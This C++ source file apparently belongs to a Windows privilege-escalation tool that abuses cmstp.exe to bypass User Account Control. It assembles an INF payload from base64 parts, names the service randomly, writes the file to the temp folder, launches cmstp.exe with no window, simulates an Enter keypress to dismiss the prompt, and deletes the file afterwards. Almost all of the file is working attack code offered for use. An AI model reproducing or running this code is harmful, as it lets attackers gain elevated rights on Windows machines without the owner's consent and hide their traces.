#include "utils.h"


// Decode base64 encoded string (Credits: StackOverflow)
std::string utils::b64_decode(const std::string_view szBuffer) {
    const uint8_t lookup[] = {
        62,  255, 62,  255, 63,  52,  53, 54, 55, 56, 57, 58, 59, 60, 61, 255,
        255, 0,   255, 255, 255, 255, 0,  1,  2,  3,  4,  5,  6,  7,  8,  9,
        10,  11,  12,  13,  14,  15,  16, 17, 18, 19, 20, 21, 22, 23, 24, 25,
        255, 255, 255, 255, 63,  255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35,
        36,  37,  38,  39,  40,  41,  42, 43, 44, 45, 46, 47, 48, 49, 50, 51 };
    static_assert(sizeof(lookup) == 'z' - '+' + 1);

    std::string out;
    int val = 0, valb = -8;
    for (uint8_t c : szBuffer) {
        if (c < '+' || c > 'z')
            break;
        c -= '+';
        if (lookup[c] >= 64)
            break;
        val = (val << 6) + lookup[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}


// Start a process by it's name (Credits: MSDN, also it's kinda borked)
bool utils::create_process(std::string szCommandLine) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = false;
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL,
        const_cast<LPSTR>(szCommandLine.c_str()),
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)
        )
    {
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// Kill a process by it's name 
void utils::kill_by_name(const char* filename) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, filename) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

// Get a random sequence of chars (Credits: StackOverflow ig)
std::string utils::random_string(size_t nLength) {
    srand(__rdtsc()); // cause im cool
    auto randchar = []() -> char
    {
        const char charset[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[rand() % max_index];
    };
    std::string str(nLength, 0);
    std::generate_n(str.begin(), nLength, randchar);
    return str;
}

// Assembles the payload by decoding the b64 payload parts
std::string deploy::craft_payload(std::string szExecutablePath) {
    std::string payload;
    std::string randName;

    randName = utils::random_string(8);

    payload = utils::b64_decode(payload::part1);
    payload += "\n" + szExecutablePath + "\n";
    payload += utils::b64_decode(payload::part2);
    payload += "\nServiceName=\"" + randName + "\"\n";
    payload += "\ShortSvcName=\"" + randName + "\"\n";
    return payload;
}

// Writes the payload to disk
void deploy::write_payload(std::string szExecutablePath) {
    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile("tmp.ini");

    std::filesystem::path fullPath(iniLocation / iniFile);
    std::filesystem::remove(fullPath);

    std::ofstream fileStream;

    fileStream.open(fullPath);
    fileStream << craft_payload(szExecutablePath);
    fileStream.close();
}

// Runs the payload to elevate the privileges
bool deploy::run_payload() {
    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile("tmp.ini");

    std::filesystem::path fullPath(iniLocation / iniFile);

    utils::kill_by_name("cmstp.exe");

    if (!utils::create_process("cmstp.exe /au " + fullPath.string())) return false;

    Sleep(500);

    // Send enter to the window 
    keybd_event(0x0D, 0, 0, 0);

    return true;
}

// Cleans up the files left from the payload
bool deploy::cleanup() {
    std::filesystem::path iniLocation(std::filesystem::temp_directory_path());
    std::filesystem::path iniFile("tmp.ini");

    std::filesystem::path fullPath(iniLocation / iniFile);
    return std::filesystem::remove(fullPath);
}